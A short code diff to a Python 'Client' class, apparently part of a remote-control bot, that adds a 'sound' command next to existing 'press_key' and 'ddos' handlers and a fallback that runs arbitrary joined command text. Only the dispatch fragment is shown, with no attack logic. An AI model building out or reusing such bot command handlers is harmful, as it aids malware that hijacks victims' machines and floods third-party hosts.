@@ -197,6 +197,8 @@ class Client:
                             command_response = commands.press_key(command[1:])
                         case "ddos":
                             command_response = commands.ddos_ip(command[1:])
+                        case "sound":
+                            command_response = commands.sound(command[1:])
                         case _:
                             # convCommand = self.arrayToString(command)
                             convCommand = " ".join(command)
